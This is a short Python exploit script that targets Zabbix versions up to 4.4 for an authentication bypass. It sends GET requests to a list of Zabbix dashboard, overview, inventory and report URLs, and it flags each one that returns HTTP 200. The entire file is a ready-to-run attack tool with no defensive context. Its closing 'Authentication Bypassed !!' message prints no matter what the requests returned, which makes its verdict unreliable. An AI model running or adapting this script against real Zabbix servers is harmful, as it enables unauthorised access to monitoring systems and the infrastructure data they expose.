#!/bin/python3

#Zabbix <= 4.4  Authentication Bypass

import requests
import sys

try:
	target = sys.argv[1] + "/zabbix/"
except:
	print("usage: "+sys.argv[0]+" http://target")
	exit()
payload = ["zabbix.php?action=dashboard.view","zabbix.php?action=dashboard.view&ddreset=1","zabbix.php?action=problem.view&ddreset=1","overview.php?ddreset=1","zabbix.php?action=web.view&ddreset=1","zabbix.php?action=web.view&ddreset=1","zabbix.php?action=web.view&ddreset=1","latest.php?ddreset=1","charts.php?ddreset=1","screens.php?ddreset=1","zabbix.php?action=map.view&ddreset=1","srv_status.php?ddreset=1","hostinventoriesoverview.php?ddreset=1","hostinventories.php?ddreset=1","report2.php?ddreset=1","toptriggers.php?ddreset=1","zabbix.php?action=dashboard.list","zabbix.php?action=dashboard.view&dashboardid=1"]

for i in payload:
	composePayload = target + i
	data = requests.get(composePayload)
	if data.status_code == 200:
		print("[+]", composePayload)
	else:
		print("[-]", composePayload)

print(" Authentication Bypassed !!")
